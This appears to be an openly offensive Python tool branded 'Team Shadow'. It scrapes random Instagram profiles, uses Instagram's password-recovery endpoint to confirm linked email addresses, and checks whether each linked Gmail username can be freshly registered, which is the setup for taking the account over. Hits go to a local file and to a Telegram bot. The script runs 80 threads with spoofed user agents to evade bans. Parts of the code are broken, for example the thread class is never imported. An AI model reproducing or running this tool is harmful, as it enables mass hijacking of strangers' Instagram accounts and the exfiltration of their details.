# Team Shadow - Instagram → Gmail Combo Checker / Bruteforcer Style 2026
# FUCK THE RULES - POWERED BY TEAM SHADOW 😈

import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from cfonts import render
from colorama import Fore, Style, init
import webbrowser

# Optional: promo yourself or your channel/group
# webbrowser.open_new("https://t.me/TeamShadowChecker")  # uncomment if you want

init(autoreset=True)

# ──────────────────────────────────────────────
#   COLORS - Team Shadow edition
# ──────────────────────────────────────────────
W = '\033[1;97m'     # white
R = '\033[1;31m'     # red
G = '\033[1;32m'     # green
Y = '\033[1;33m'     # yellow
B = '\033[1;34m'     # blue
P = '\033[1;35m'     # purple
C = '\033[1;36m'     # cyan
SHADOW = '\033[38;5;93m'   # deep purple/violet
BLOOD = '\033[38;5;196m'   # blood red

# ──────────────────────────────────────────────
#   ENDPOINTS & CONSTANTS
# ──────────────────────────────────────────────
INSTA_RECOVERY = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
IG_SIG_KEY = 'ig_sig_key_version'
SIGNED = 'signed_body'
IG_COOKIE = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'

GOOGLE_URL = 'https://accounts.google.com'
TOKEN_FILE = 'shadow_token.txt'
DOMAIN = '@gmail.com'

hits_total = 0
hits_good = 0
bad_ig = 0
bad_gmail = 0
good_ig = 0
cache_insta = {}

# ──────────────────────────────────────────────
#   BANNER - TEAM SHADOW
# ──────────────────────────────────────────────
print(render('TEAM SHADOW', colors=['red', 'purple'], align='center'))
print(f"   {BLOOD}Instagram → Gmail Hunter  //  Team Shadow{W}\n")
print(f"   {SHADOW}No mercy. No limits. Just hits.{W}\n")

telegram_id = input(f"{C}Your Telegram Chat ID » {W}")
bot_token   = input(f"{C}Telegram Bot Token » {W}")
os.system('clear' if os.name == 'posix' else 'cls')

def print_stats():
    stat = f"{G}HITS: {W}{hits_good}   {R}BAD IG: {W}{bad_ig}   {R}BAD GMAIL: {W}{bad_gmail}   {B}GOOD IG: {W}{good_ig}"
    sys.stdout.write(f"\r{stat.ljust(90)}")
    sys.stdout.flush()

# ──────────────────────────────────────────────
#   REFRESH GOOGLE TOKEN (very important)
# ──────────────────────────────────────────────
def refresh_token():
    try:
        letters = 'abcdefghijklmnopqrstuvwxyz'
        fn = ''.join(choice(letters) for _ in range(randrange(6,10)))
        ln = ''.join(choice(letters) for _ in range(randrange(4,9)))

        h = {
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'user-agent': generate_user_agent()
        }

        r = requests.get(
            f"{GOOGLE_URL}/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en",
            headers=h
        )

        tok = re.search(r'data-initial-setup-data="%.@.*?"(.*?)&quot;', r.text)
        if not tok:
            raise Exception()

        tok = tok.group(1).split(',')[-1].strip('"')

        cookies = {'__Host-GAPS': ''.join(choice(string.ascii_letters + string.digits) for _ in range(45))}

        data = {
            'f.req': f'["{tok}","{fn}","{ln}","{fn}","{ln}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
        }

        rr = requests.post(
            f"{GOOGLE_URL}/_/signup/validatepersonaldetails",
            cookies=cookies, headers=h, data=data
        )

        token_line = rr.text.split('",null,"')[1].split('"')[0]
        gaps = rr.cookies.get('__Host-GAPS')

        with open(TOKEN_FILE, 'w') as f:
            f.write(f"{token_line}//{gaps}\n")

        print(f"{G}[+] Google token refreshed{W}")
    except:
        print(f"{R}[-] Token refresh failed → retrying...{W}")
        time.sleep(1.2)
        refresh_token()

refresh_token()

# ──────────────────────────────────────────────
#   CHECK GMAIL AVAILABILITY
# ──────────────────────────────────────────────
def check_gmail_avail(username):
    global hits_good, bad_gmail

    try:
        with open(TOKEN_FILE) as f:
            tl, gaps = f.read().strip().split('//')

        cookies = {'__Host-GAPS': gaps}
        headers = {
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': GOOGLE_URL,
            'referer': f"https://accounts.google.com/signup/v2/createusername?TL={tl}",
            'user-agent': generate_user_agent()
        }

        payload = (
            f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&"
            f"f.req=%5B%22TL%3A{tl}%22%2C%22{username}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&"
            f"flowName=GlifWebSignIn"
        )

        r = pp(
            f"{GOOGLE_URL}/_/signup/usernameavailability?TL={tl}",
            cookies=cookies, headers=headers, data=payload
        )

        if '"gf.uar",1' in r.text:
            hits_good += 1
            print_stats()
            save_hit(username)
        else:
            bad_gmail += 1
            print_stats()

    except:
        bad_gmail += 1
        print_stats()

# ──────────────────────────────────────────────
#   CHECK INSTAGRAM EMAIL EXISTENCE
# ──────────────────────────────────────────────
def check_insta(email):
    global good_ig, bad_ig

    try:
        ua = generate_user_agent()
        dev = 'android-' + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
        guid = str(uuid.uuid4())

        h = {
            'User-Agent': ua,
            'Cookie': IG_COOKIE,
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }

        payload = {
            SIGNED: '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
                '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                'adid': guid,
                'guid': guid,
                'device_id': dev,
                'query': email
            }),
            IG_SIG_KEY: '4'
        }

        r = requests.post(INSTA_RECOVERY, headers=h, data=payload).text

        if email in r:
            good_ig += 1
            print_stats()
            if DOMAIN in email:
                check_gmail_avail(email.replace(DOMAIN, ''))
        else:
            bad_ig += 1
            print_stats()

    except:
        bad_ig += 1
        print_stats()

# ──────────────────────────────────────────────
#   SAVE & SEND HIT
# ──────────────────────────────────────────────
def save_hit(username):
    global hits_total
    hits_total += 1

    acc = cache_insta.get(username, {})
    flwrs = acc.get('follower_count', '?')
    flwng = acc.get('following_count', '?')
    posts = acc.get('media_count', '?')
    bio   = acc.get('biography', 'Empty')

    reset = get_reset_email(username)

    msg = f"""
{BLOOD}╔════════════════════════════════════╗{W}
{BLOOD}║       TEAM SHADOW - HIT #{hits_total}      ║{W}
{BLOOD}╚════════════════════════════════════╝{W}

{G}USER     : {W}{username}
{G}EMAIL    : {W}{username}{DOMAIN}
{G}FOLLOWERS: {W}{flwrs}
{G}FOLLOWING: {W}{flwng}
{G}POSTS    : {W}{posts}
{G}BIO      : {W}{bio[:90]}
{G}RESET TO : {W}{reset}

{BLOOD}═══════════════════════════════════════════{W}
"""

    with open('shadow_hits.txt', 'a', encoding='utf-8') as f:
        f.write(msg + "\n\n")

    try:
        requests.get(
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            params={"chat_id": telegram_id, "text": msg}
        )
    except:
        pass

# ──────────────────────────────────────────────
#   FAKE RESET EMAIL (old trick)
# ──────────────────────────────────────────────
def get_reset_email(user):
    try:
        h = {
            'User-Agent': 'Instagram 100.0.0.17.129 Android ...',
            'X-IG-App-ID': '567067343352427',
            'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Cookie': IG_COOKIE
        }

        p = {
            SIGNED: '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'
                    '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"' + user + '"}',
            IG_SIG_KEY: '4'
        }

        r = requests.post(INSTA_RECOVERY, headers=h, data=p).json()
        return r.get('email', 'None found')
    except:
        return 'None found'

# ──────────────────────────────────────────────
#   MAIN SPAM THREAD
# ──────────────────────────────────────────────
def shadow_spam():
    while True:
        try:
            lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            doc = '25618261841150840'
            uid = random.randint(266028916, 1900000000)

            data = {
                'lsd': lsd,
                'variables': json.dumps({'id': uid, 'render_surface': 'PROFILE'}),
                'doc_id': doc
            }

            headers = {'X-FB-LSD': lsd}

            r = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            user = r.json().get('data', {}).get('user', {})

            uname = user.get('username')
            if uname:
                cache_insta[uname] = user
                check_insta(uname + DOMAIN)

        except:
            time.sleep(random.uniform(0.2, 0.7))

# ──────────────────────────────────────────────
#   START
# ──────────────────────────────────────────────
print(f"\n{SHADOW}[+] Launching shadow threads...{W}\n")
print_stats()

for _ in range(80):   # 80-120 is sweet spot in 2026 (too many = instant ban)
    Thread(target=shadow_spam, daemon=True).start()

try:
    while True:
        time.sleep(666)
except KeyboardInterrupt:
    print(f"\n{BLOOD}[!] Stopped. Hits saved → shadow_hits.txt{W}")
